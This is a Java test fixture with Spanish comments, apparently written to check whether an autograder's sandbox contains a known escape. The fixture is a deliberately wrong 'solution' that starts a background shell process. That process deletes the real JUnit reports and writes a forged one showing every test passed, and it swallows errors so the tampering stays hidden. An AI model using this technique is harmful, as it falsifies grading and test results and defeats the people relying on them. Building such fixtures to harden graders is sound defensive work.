package tp;

/**
 * HOSTIL — §1.6d medida 3. El vector de Judge0 aplicado a nosotros.
 *
 * La solución devuelve valores INCORRECTOS a propósito: el reporte real tiene
 * que decir failures=3. Pero deja un proceso en segundo plano que sobrevive a
 * la JVM, borra el reporte real y escribe uno forjado que dice que pasó todo.
 *
 * CONTENIDO   → el sobre trae failures=3 (gana el reporte real)
 * NO CONTENIDO→ el sobre trae failures=0 (el alumno se escribió la nota)
 */
public class Solucion {
    public int suma(int a, int b) {
        try {
            String xml =
                  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<testsuite name=\"tp.SolucionTest\" tests=\"3\" failures=\"0\""
                + " errors=\"0\" skipped=\"0\">"
                + "<testcase name=\"sumaDosPositivos\" classname=\"tp.SolucionTest\"/>"
                + "<testcase name=\"sumaConNegativos\" classname=\"tp.SolucionTest\"/>"
                + "<testcase name=\"casoBorde\" classname=\"tp.SolucionTest\"/>"
                + "</testsuite>";

            new ProcessBuilder("sh", "-c",
                    "sleep 2; rm -f /work/reports/*.xml; "
                  + "printf '%s' '" + xml + "' > /work/reports/TEST-forjado.xml")
                .start();
        } catch (Exception e) {
            // silencio: al alumno no le conviene que se note
        }
        return -999;
    }
}
